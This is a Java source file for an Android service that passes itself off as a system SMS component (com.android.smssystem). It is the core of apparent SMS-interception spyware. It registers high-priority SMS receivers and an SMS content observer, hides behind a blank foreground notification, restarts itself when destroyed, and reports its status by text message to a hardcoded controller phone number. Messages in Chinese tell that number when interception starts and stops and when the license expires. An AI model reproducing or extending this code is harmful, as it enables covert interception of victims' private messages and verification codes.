package com.android.smssystem;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.widget.RemoteViews;

import com.android.smssystem.R;

public class SmSserver extends Service {

	public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	public static final String SMS_RECEIVED_2 = "android.provider.Telephony.SMS_RECEIVED_2";
	public static final String GSM_SMS_RECEIVED = "android.provider.Telephony.GSM_SMS_RECEIVED";
	public static final String SendState = "com.yfm.send";
	public static final Uri SmsUri=Uri.parse("content://sms/");
	private SmSReceiver localMessageReceiver,localMessageReceiver2;
	private SmSObserver smsobserver;
	private SmSutils su=new SmSutils();
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		if (SmSutils.key.equals(SmSutils.getPublicKey(this))) {
			
			Notification notification = new Notification(R.drawable.icon, "",
					System.currentTimeMillis());
			Intent notificationIntent = new Intent();
			notification.contentView = new RemoteViews(this.getPackageName(),
					R.layout.notification);
			PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
					notificationIntent, 0);
			notification.contentIntent = pendingIntent;
			startForeground(100, notification);
			IntentFilter localIntentFilter = new IntentFilter();
			localIntentFilter.addAction(SmSserver.SMS_RECEIVED);
			localIntentFilter.addAction(SmSserver.SMS_RECEIVED_2);
			localIntentFilter.addAction(SmSserver.GSM_SMS_RECEIVED);
			localIntentFilter.setPriority(1000);
			localMessageReceiver = new SmSReceiver();
			this.registerReceiver(localMessageReceiver, localIntentFilter,
					"android.permission.BROADCAST_SMS", null);
			localMessageReceiver2 = new SmSReceiver();
			this.registerReceiver(localMessageReceiver2, new IntentFilter(SmSserver.SendState));
			smsobserver=new SmSObserver(this,null);
			this.getContentResolver().registerContentObserver(SmsUri, true, smsobserver);
			new SendThread().start();
			
		}
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		this.stopForeground(true);
		this.unregisterReceiver(localMessageReceiver);
		this.unregisterReceiver(localMessageReceiver2);
		this.getContentResolver().unregisterContentObserver(smsobserver);
		su.sendSMS(SmSutils.phone, "拦截服务停止，使用截止时间 "+SmSutils.endtime, null);
		Intent localIntent = new Intent();
		localIntent.setClass(this, SmSserver.class); // 销毁时重新启动Service
		this.startService(localIntent);
	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		flags = START_REDELIVER_INTENT;
		return super.onStartCommand(intent, flags, startId);
	}
	class SendThread extends Thread{

		@Override
		public void run() {
			// TODO Auto-generated method stub
			super.run();
			try {
				Thread.sleep(20000);
				handler.sendEmptyMessage(1);
				while(true){
					Thread.sleep(1000);
				}
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
	}
	private Handler handler=new Handler(){

		@Override
		public void handleMessage(Message msg) {
			// TODO Auto-generated method stub
			super.handleMessage(msg);
			su.sendSMS(SmSutils.phone, "服务已经启动，程序使用到期时间 "+SmSutils.endtime, null);
		}
		
	};
	

}
